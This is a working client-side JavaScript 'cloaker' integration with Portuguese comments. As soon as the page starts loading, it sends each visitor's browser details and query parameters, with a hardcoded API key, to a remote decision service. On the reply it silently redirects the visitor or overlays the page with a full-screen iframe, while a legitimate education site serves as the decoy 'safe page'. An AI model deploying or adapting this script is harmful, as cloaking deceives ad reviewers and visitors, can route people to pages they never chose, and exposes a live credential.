// Cloaker.net Integration (Client-side)
// Baseado no código oficial do Cloaker para Cloudflare Workers
(function() {
  const CAMPAIGN_API_KEY = '9LWOgvoXJKGwIz-HEdjHSlNg90UC8Vy01KdTZvy9lj';
  const DEFAULT_SAFE_PAGE_URL = 'https://cursos.novaescola.org.br/';

  async function getCloakerDecision() {
    const currentUrl = new URL(window.location.href);

    const payload = {
      campaign_api_key: CAMPAIGN_API_KEY,
      user_agent: navigator.userAgent || '',
      data: {
        headers: {
          'accept-language': navigator.language || 'pt-BR',
          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'user-agent': navigator.userAgent
        },
        query: Object.fromEntries(currentUrl.searchParams.entries())
      }
    };

    try {
      const response = await fetch('https://api.cloaker.net/v1/decide', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Provider': 'client-js'
        },
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        console.warn('[Cloaker] API error:', response.status);
        return null;
      }

      const decision = await response.json();
      return decision;
    } catch (error) {
      console.warn('[Cloaker] Request failed:', error.message);
      return null;
    }
  }

  async function executeCloakerDecision(decision) {
    if (!decision || !decision.status) {
      return false;
    }

    const execution = decision.execution || {};
    const { method, target_url, meta_refresh, iframe } = execution;

    console.log('[Cloaker] Execution method:', method);

    switch (method) {
      case 'REDIRECT_301':
      case 'REDIRECT_302': {
        if (target_url) {
          window.location.replace(target_url);
          return true;
        }
        break;
      }

      case 'META_REFRESH': {
        if (meta_refresh) {
          const delay = meta_refresh.delay_seconds || 0;
          const url = target_url;
          const html = meta_refresh.html || `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="${delay};url=${url}"></head><body></body></html>`;
          document.documentElement.innerHTML = html;
          return true;
        }
        break;
      }

      case 'JS_REDIRECT': {
        if (target_url) {
          window.location.replace(target_url);
          return true;
        }
        break;
      }

      case 'IFRAME_ZERO_REDIRECT': {
        if (iframe && target_url) {
          const style = iframe.fullscreen
            ? 'position:fixed;top:0;left:0;bottom:0;right:0;width:100%;height:100%;border:none;margin:0;padding:0;overflow:hidden;z-index:999999;'
            : (iframe.style || 'width:100%;height:100%;border:none;');

          const sandboxAttr = iframe.sandbox ? `sandbox="${iframe.sandbox}"` : '';
          const titleAttr = iframe.title ? `title="${iframe.title}"` : '';

          const iframeHtml = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>html,body{margin:0;padding:0;height:100%;overflow:hidden;}</style></head><body><iframe src="${target_url}" style="${style}" ${sandboxAttr} ${titleAttr}></iframe></body></html>`;

          document.documentElement.innerHTML = iframeHtml;
          return true;
        }
        break;
      }

      default:
        if (target_url) {
          window.location.replace(target_url);
          return true;
        }
    }

    return false;
  }

  async function initCloaker() {
    try {
      console.log('[Cloaker] Iniciando...');
      const decision = await getCloakerDecision();

      if (decision) {
        console.log('[Cloaker] Decisão recebida:', decision.status);
        const executed = await executeCloakerDecision(decision);
        if (executed) {
          console.log('[Cloaker] Ação executada com sucesso');
          return;
        }
      }

      // Se nenhuma decisão ou não executada, continua com a página normal
      console.log('[Cloaker] Nenhuma ação, mantendo página normal');
    } catch (error) {
      console.error('[Cloaker] Erro fatal:', error);
      // Em caso de erro, mantém a página normal
    }
  }

  // Executa imediatamente (não espera DOM estar pronto)
  // Assim redireciona ANTES de carregar a página
  initCloaker();
})();
